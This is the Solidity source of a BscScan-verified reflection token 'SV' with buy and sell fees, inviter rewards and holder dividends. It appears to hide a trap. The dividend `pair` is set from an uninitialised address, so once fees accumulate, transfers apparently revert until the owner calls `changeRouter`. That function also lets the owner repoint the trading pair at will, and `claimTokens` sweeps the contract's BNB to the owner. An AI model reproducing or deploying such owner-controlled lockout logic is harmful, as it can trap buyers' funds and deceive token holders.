/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}



contract Ownable {
    address public _owner;

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
	
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract SV is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => address) inviter;
    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    address private _default = address(0xce90Ec31603d313f8B3086434D3FbFB26cB1C260);
    address public uniswapV2Pair;
    IERC20 pair;
    uint256 public startTime;
    address[] buyUser;
    mapping(address => bool) public havePush;

    constructor(address tokenOwner,address router,address otherToken) {
        _name = "SV";
        _symbol = "SV";
        _decimals = 18;
        _tTotal = 31000 * 10**18;
        _rTotal = (MAX - (MAX % _tTotal));
        _rOwned[tokenOwner] = _rTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _owner = msg.sender;
        address recipient;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), otherToken);
        pair = IERC20(recipient);
        
        emit Transfer(address(0), tokenOwner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
		_transfer(sender, recipient, amount);
        if(recipient == uniswapV2Pair && amount >= _tTotal.div(100000000) && startTime == 0){
            startTime = block.timestamp;
            havePush[sender] = true;
            buyUser.push(sender);
		}
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
	
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
	
    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
	
	function uniswapV2PairSync() public returns(bool){
        (bool success, ) = uniswapV2Pair.call(abi.encodeWithSelector(0xfff6cae9));
        return success;
    }
	
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
		
        bool isInviter = from != uniswapV2Pair && balanceOf(to) == 0 && inviter[to] == address(0);
        bool takeFee = true;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }else{
            if(from == uniswapV2Pair){
                
            }else if(to == uniswapV2Pair){

            }else{
                takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
        if(!havePush[from] && to == uniswapV2Pair){
            havePush[from] = true;
            buyUser.push(from);
        }
        if(isInviter) {
            inviter[to] = from;
        }
        _splitOtherToken();
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();

        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
        
            _takeTransfer(
                sender,
                address(this),
                tAmount.mul(3).div(100),
                currentRate
            );

            _takeInviterFee(sender, recipient, tAmount, currentRate);//2

            rate = 5;
        }

        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.mul(recipientRate).div(100)
        );
        emit Transfer(sender, recipient, tAmount.mul(recipientRate).div(100));
    }
	
    function _splitOtherToken() private {
        uint256 thisAmount = balanceOf(address(this));
        if(thisAmount >= 10**18){
            _splitOtherTokenSecond(thisAmount);
        }
    }

    function getLDXsize() public view returns(uint256){
        return buyUser.length;
    }
    
    function _splitOtherTokenSecond(uint256 thisAmount) private {
        if(thisAmount >= 0){
            uint256 buySize = buyUser.length;
            if(buySize>0){
                address user;
                uint256 startIndex;
                uint256 totalAmount = pair.totalSupply();

                if(totalAmount>0){
					uint256 rate;
					if(buySize >20){
                        startIndex = block.timestamp.mod(buySize-20);
						for(uint256 i=0;i<20;i++){
							user = buyUser[startIndex+i];
							if(balanceOf(user) >= 0){
								rate = pair.balanceOf(user).mul(1000000).div(totalAmount);
								if(rate>0){
                                    _tokenTransfer(address(this), user, thisAmount.mul(rate).div(1000000), false);
								}
							}
						}
					}else{
						for(uint256 i=0;i<buySize;i++){
							user = buyUser[i];
							if(balanceOf(user) >= 0){
								rate = pair.balanceOf(user).mul(1000000).div(totalAmount);
								if(rate>0){
									_tokenTransfer(address(this), user, thisAmount.mul(rate).div(1000000), false);
								}
							}
						}
					}
				}
                
            }
        }
    }
	
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }

    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
        pair = IERC20(router);
        startTime = block.timestamp;
    }


function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        address cur;
        address recieveD;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        for (int256 i = 0; i < 1; i++) {
            uint256 rate;
            if(i==0){
                rate = 2;
            }
            cur = inviter[cur];
            if (cur == address(0)) {
                recieveD = _default;
            }else{
				recieveD = cur;
			}
            uint256 curTAmount = tAmount.mul(rate).div(100);
            uint256 curRAmount = curTAmount.mul(currentRate);
            _rOwned[recieveD] = _rOwned[recieveD].add(curRAmount);
            emit Transfer(sender, recieveD, curTAmount);
        }
    }
}